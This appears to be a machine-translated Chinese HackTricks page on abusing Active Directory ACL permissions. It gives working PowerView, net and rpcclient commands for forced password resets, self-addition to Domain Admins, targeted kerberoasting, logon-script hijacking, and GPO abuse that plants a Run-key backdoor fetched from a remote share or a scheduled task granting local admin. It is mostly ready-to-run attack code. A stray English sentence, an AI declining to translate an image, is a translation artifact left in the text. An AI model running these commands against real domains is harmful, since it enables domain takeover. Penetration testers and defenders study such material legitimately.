# 滥用Active Directory ACLs/ACEs

<details>

<summary><strong>从零开始学习AWS黑客攻击直到成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter**上**关注**我 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

找到对您最重要的漏洞，以便更快修复它们。Intruder追踪您的攻击面，进行主动威胁扫描，在您的整个技术栈中找到问题，从API到Web应用程序和云系统。[**今天就免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## 上下文

本实验室旨在滥用Active Directory自由裁量访问控制列表（DACLs）和构成DACLs的访问控制条目（ACEs）的弱权限。

Active Directory对象，如用户和组，是可保护对象，DACL/ACEs定义了谁可以读取/修改这些对象（例如更改账户名，重置密码等）。

这里可以看到"域管理员"可保护对象的ACEs示例：

![](../../../.gitbook/assets/1.png)

作为攻击者，我们感兴趣的一些Active Directory对象权限和类型包括：

* **GenericAll** - 对象的全部权限（将用户添加到组或重置用户密码）
* **GenericWrite** - 更新对象的属性（例如登录脚本）
* **WriteOwner** - 将对象所有者更改为攻击者控制的用户，接管对象
* **WriteDACL** - 修改对象的ACEs并给攻击者完全控制对象的权限
* **AllExtendedRights** - 将用户添加到组或重置密码的能力
* **ForceChangePassword** - 更改用户密码的能力
* **Self (Self-Membership)** - 将自己添加到组的能力

在这个实验室中，我们将探索并尝试利用上述大部分ACEs。

值得熟悉所有的[BloodHound边缘](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html)和尽可能多的Active Directory[扩展权限](https://learn.microsoft.com/en-us/windows/win32/adschema/extended-rights)，因为在评估过程中您可能会遇到不太常见的权限。

## 用户的GenericAll

使用powerview，让我们检查我们的攻击用户`spotless`是否拥有用户`delegate`的AD对象的`GenericAll权限`：
```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
```
我们可以看到，的确我们的用户 `spotless` 拥有 `GenericAll` 权限，有效地使攻击者能够接管该账户：

![](../../../.gitbook/assets/2.png)

*   **更改密码**：你可以直接更改该用户的密码：

```bash
net user <username> <password> /domain
```
*   **定向Kerberoasting**：你可以通过设置一个 **SPN** 使用户 **kerberoastable**，然后进行kerberoast并尝试离线破解：

```powershell
# 设置SPN
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
# 获取哈希
.\Rubeus.exe kerberoast /user:<username> /nowrap
# 清除SPN
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose

# 你也可以使用工具 https://github.com/ShutdownRepo/targetedKerberoast
# 来获取一个或所有用户的哈希
python3 targetedKerberoast.py -domain.local -u <username> -p password -v
```
*   **定向ASREPRoasting**：你可以通过 **禁用** **预认证** 使用户 **ASREPRoastable**，然后进行ASREPRoast。

```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

## 对组的GenericAll

让我们看看 `Domain admins` 组是否有任何弱权限。首先，让我们获取它的 `distinguishedName`：
```csharp
Get-NetGroup "domain admins" -FullData
```
Since the provided text is an image and I am an AI text-based model, I'm unable to directly translate the content within images. If you can provide the text from the image, I would be happy to translate it for you.
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}
```
我们可以看到，我们的攻击用户`spotless`再次拥有`GenericAll`权限：

![](../../../.gitbook/assets/5.png)

实际上，这允许我们将自己（用户`spotless`）添加到`Domain Admin`组：
```csharp
net group "domain admins" spotless /add /domain
```
![](../../../.gitbook/assets/6.gif)

同样可以通过Active Directory或PowerSploit模块实现：
```csharp
# with active directory module
Add-ADGroupMember -Identity "domain admins" -Members spotless

# with Powersploit
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## GenericAll / GenericWrite / Write on Computer/User

* 如果你在**计算机对象**上拥有这些权限，你可以执行[Kerberos **基于资源的受限委派**: 计算机对象接管](../resource-based-constrained-delegation.md)。
* 如果你对用户拥有这些权限，你可以使用[本页中首先解释的方法之一](./#genericall-on-user)。
* 或者，无论你是在计算机还是用户上拥有权限，你都可以使用**Shadow Credentials**来模拟它：

{% content-ref url="shadow-credentials.md" %}
[shadow-credentials.md](shadow-credentials.md)
{% endcontent-ref %}

## WriteProperty on Group

如果我们控制的用户在`Domain Admin`组的`All`对象上拥有`WriteProperty`权限：

![](../../../.gitbook/assets/7.png)

我们可以再次将自己添加到`Domain Admins`组并提升权限：
```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
![](../../../.gitbook/assets/8.png)

## Self (Self-Membership) on Group

另一个允许攻击者将自己添加到组的权限：

![](../../../.gitbook/assets/9.png)
```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
![](../../../.gitbook/assets/10.png)

## WriteProperty（自我成员资格）

另一个允许攻击者将自己添加到组的权限：
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/11.png)
```csharp
net group "domain admins" spotless /add /domain
```
![](../../../.gitbook/assets/12.png)

## **ForceChangePassword**

如果我们对 `User-Force-Change-Password` 对象类型拥有 `ExtendedRight`，我们可以在不知道用户当前密码的情况下重置用户的密码：
```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/13.png)

使用powerview执行相同操作：
```csharp
Set-DomainUserPassword -Identity delegate -Verbose
```
![](../../../.gitbook/assets/14.png)

另一种不需要处理密码安全字符串转换的方法：
```csharp
$c = Get-Credential
Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
```
```markdown
![](../../../.gitbook/assets/15.png)

...或者如果没有交互式会话可用时的一行命令：
```
```csharp
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
![](../../../.gitbook/assets/16.png)

以及从linux实现这一目标的最后一种方式：
```markup
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
更多信息：

* [https://malicious.link/post/2017/reset-ad-user-password-with-linux/](https://malicious.link/post/2017/reset-ad-user-password-with-linux/)
* [https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN)
* [https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c)

## 对群组的WriteOwner权限

注意，在攻击之前，`Domain Admins`的所有者是`Domain Admins`：

![](../../../.gitbook/assets/17.png)

在完成ACE枚举之后，如果我们发现我们控制的用户对`ObjectType:All`拥有`WriteOwner`权限
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/18.png)

...我们可以将`Domain Admins`对象的所有者更改为我们的用户，在我们的案例中是`spotless`。请注意，用`-Identity`指定的SID是`Domain Admins`组的SID：
```csharp
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
//You can also use the name instad of the SID (HTB: Reel)
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## 用户的GenericWrite权限
```csharp
Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/20.png)

`WriteProperty` 在一个 `ObjectType` 上，这里特指 `Script-Path`，允许攻击者重写 `delegate` 用户的登录脚本路径，这意味着下一次当用户 `delegate` 登录时，他们的系统将执行我们的恶意脚本：
```csharp
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
以下显示了用户在AD中的~~`delegate`~~登录脚本字段已更新：

![](../../../.gitbook/assets/21.png)

## 对组的GenericWrite

这允许您将新用户（例如您自己）设置为组的成员：
```powershell
# Create creds
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
# Add user to group
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
# Check user was added
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
# Remove group member
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

找到对您最重要的漏洞，以便您能更快修复它们。Intruder 跟踪您的攻击面，运行主动威胁扫描，在您的整个技术栈中找到问题，从 APIs 到 web 应用程序和云系统。今天就[**免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## WriteDACL + WriteOwner

如果您是某个组的所有者，就像我是 `Test` AD 组的所有者：

![](../../../.gitbook/assets/22.png)

当然，您也可以通过 powershell 来完成：
```csharp
([ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local").PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value
```
```markdown
![](../../../.gitbook/assets/23.png)

如果你对该AD对象有`WriteDACL`权限：

![](../../../.gitbook/assets/24.png)

...你可以通过一点ADSI魔法给自己赋予[`GenericAll`](../../../windows/active-directory-methodology/broken-reference/)权限：
```
```csharp
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
```markdown
这意味着你现在完全控制了AD对象：

![](../../../.gitbook/assets/25.png)

这实际上意味着你现在可以向该组添加新用户。

值得注意的是，我无法通过使用Active Directory模块和`Set-Acl` / `Get-Acl` cmdlets来滥用这些权限：
```
```csharp
$path = "AD:\CN=test,CN=Users,DC=offense,DC=local"
$acl = Get-Acl -Path $path
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule (New-Object System.Security.Principal.NTAccount "spotless"),"GenericAll","Allow"
$acl.AddAccessRule($ace)
Set-Acl -Path $path -AclObject $acl
```
![](../../../.gitbook/assets/26.png)

## **域复制 (DCSync)**

**DCSync** 权限意味着拥有对域本身的以下权限：**DS-Replication-Get-Changes**、**Replicating Directory Changes All** 和 **Replicating Directory Changes In Filtered Set**。\
[**在此了解更多关于DCSync攻击的信息。**](../dcsync.md)

## GPO 委派 <a href="#gpo-delegation" id="gpo-delegation"></a>

有时，某些用户/组可能被委派权限来管理组策略对象，就像 `offense\spotless` 用户的情况：

![](../../../.gitbook/assets/a13.png)

我们可以像这样利用 PowerView 来查看：
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
以下指出用户 `offense\spotless` 拥有 **WriteProperty**、**WriteDacl**、**WriteOwner** 权限，以及其他几个容易被滥用的权限：

![](../../../.gitbook/assets/a14.png)

### 枚举 GPO 权限 <a href="#abusing-the-gpo-permissions" id="abusing-the-gpo-permissions"></a>

我们知道上面截图中的 ObjectDN 指的是 `New Group Policy Object` GPO，因为 ObjectDN 指向 `CN=Policies`，同时也有 `CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}`，这与下面高亮显示的 GPO 设置相同：

![](../../../.gitbook/assets/a15.png)

如果我们想要特别搜索配置不当的 GPOs，我们可以像这样串联使用 PowerSploit 的多个 cmdlets：
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/a16.png)

**应用给定策略的计算机**

我们现在可以解析应用了 `Misconfigured Policy` GPO的计算机名称：
```powershell
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```
![](../../../.gitbook/assets/a17.png)

**应用于特定计算机的策略**
```powershell
Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
```
```markdown
![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBOmSsNrObOboiT2E%2FScreenshot%20from%202019-01-16%2019-44-19.png?alt=media\&token=34332022-c1fc-4f97-a7e9-e0e4d98fa8a5)

**应用了特定策略的组织单位(OUs)**
```
```powershell
Get-DomainOU -GPLink "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" -Properties DistinguishedName
```
![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBtLT332kTVDzd5qV%2FScreenshot%20from%202019-01-16%2019-46-33.png?alt=media\&token=ec90fdc0-e0dc-4db0-8279-cde4720df598)

### **滥用 GPO -** [New-GPOImmediateTask](https://github.com/3gstudent/Homework-of-Powershell/blob/master/New-GPOImmediateTask.ps1)

滥用此配置错误并执行代码的方法之一是通过 GPO 创建一个立即执行的计划任务，如下所示：
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
![](../../../.gitbook/assets/a19.png)

上图将会把我们的用户spotless添加到被攻破机器的本地`administrators`组。注意，在代码执行前，组内不包含用户`spotless`：

![](../../../.gitbook/assets/a20.png)

### GroupPolicy模块 **- 滥用GPO**

{% hint style="info" %}
你可以通过`Get-Module -List -Name GroupPolicy | select -expand ExportedCommands`来检查GroupPolicy模块是否已安装。在紧急情况下，你可以作为本地管理员使用`Install-WindowsFeature –Name GPMC`来安装它。
{% endhint %}
```powershell
# Create new GPO and link it with the OU Workstrations
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
# Make the computers inside Workstrations create a new reg key that will execute a backdoor
## Search a shared folder where you can write and all the computers affected can read
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
这个有效载荷，在GPO更新后，还需要有人登录到计算机中。

### [**SharpGPOAbuse**](https://github.com/FSecureLABS/SharpGPOAbuse) **- 滥用GPO**

{% hint style="info" %}
它不能创建GPO，因此我们仍然需要使用RSAT来创建，或者修改我们已经有写权限的GPO。
{% endhint %}
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### 强制策略更新 <a href="#force-policy-update" id="force-policy-update"></a>

之前滥用的**GPO更新**大约每90分钟重新加载一次。\
如果你可以访问计算机，可以使用 `gpupdate /force` 强制执行。

### 内部原理 <a href="#under-the-hood" id="under-the-hood"></a>

如果我们观察 `Misconfigured Policy` GPO 的计划任务，我们可以看到我们的 `evilTask` 就在那里：

![](../../../.gitbook/assets/a22.png)

以下是由 `New-GPOImmediateTask` 创建的 XML 文件，它代表我们在 GPO 中的恶意计划任务：

{% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
<ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="evilTask" image="0" changed="2018-11-20 13:43:43" uid="{6cc57eac-b758-4c52-825d-e21480bbb47f}" userContext="0" removePolicy="0">
<Properties action="C" name="evilTask" runAs="NT AUTHORITY\System" logonType="S4U">
<Task version="1.3">
<RegistrationInfo>
<Author>NT AUTHORITY\System</Author>
<Description></Description>
</RegistrationInfo>
<Principals>
<Principal id="Author">
<UserId>NT AUTHORITY\System</UserId>
<RunLevel>HighestAvailable</RunLevel>
<LogonType>S4U</LogonType>
</Principal>
</Principals>
<Settings>
<IdleSettings>
<Duration>PT10M</Duration>
<WaitTimeout>PT1H</WaitTimeout>
<StopOnIdleEnd>true</StopOnIdleEnd>
<RestartOnIdle>false</RestartOnIdle>
</IdleSettings>
<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
<AllowHardTerminate>false</AllowHardTerminate>
<StartWhenAvailable>true</StartWhenAvailable>
<AllowStartOnDemand>false</AllowStartOnDemand>
<Enabled>true</Enabled>
<Hidden>true</Hidden>
<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
<Priority>7</Priority>
<DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
<RestartOnFailure>
<Interval>PT15M</Interval>
<Count>3</Count>
</RestartOnFailure>
</Settings>
<Actions Context="Author">
<Exec>
<Command>cmd</Command>
<Arguments>/c net localgroup administrators spotless /add</Arguments>
</Exec>
</Actions>
<Triggers>
<TimeTrigger>
<StartBoundary>%LocalTimeXmlEx%</StartBoundary>
<EndBoundary>%LocalTimeXmlEx%</EndBoundary>
<Enabled>true</Enabled>
</TimeTrigger>
</Triggers>
</Task>
</Properties>
</ImmediateTaskV2>
</ScheduledTasks>
```
{% endcode %}

### 用户和组 <a href="#users-and-groups" id="users-and-groups"></a>

通过滥用GPO的用户和组功能，也可以实现同样的权限提升。注意下面文件中的第6行，用户`spotless`被添加到本地的`administrators`组中 - 我们可以更改用户为其他用户，添加更多用户，甚至将用户添加到另一个组/多个组，因为我们可以修改由于GPO委派给我们的用户`spotless`，所以可以修改显示位置的策略配置文件：

{% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\Groups" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
<Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators (built-in)" image="2" changed="2018-12-20 14:08:39" uid="{300BCC33-237E-4FBA-8E4D-D8C3BE2BB836}">
<Properties action="U" newName="" description="" deleteAllUsers="0" deleteAllGroups="0" removeAccounts="0" groupSid="S-1-5-32-544" groupName="Administrators (built-in)">
<Members>
<Member name="spotless" action="ADD" sid="" />
</Members>
</Properties>
</Group>
</Groups>
```
```markdown
{% endcode %}

此外，我们可以考虑利用登录/注销脚本，使用注册表进行自动运行，安装 .msi，编辑服务和类似的代码执行途径。

## 参考资料

* 最初，这些信息主要是从 [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) 复制的
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

找到对您最重要的漏洞，以便您能更快修复它们。Intruder 跟踪您的攻击面，运行主动威胁扫描，在您的整个技术栈中找到问题，从 API 到 Web 应用程序和云系统。[**免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 今天。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> 从零开始学习 AWS 黑客攻击！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 HackTricks 中看到您的**公司广告**或**下载 HackTricks 的 PDF**，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>
```
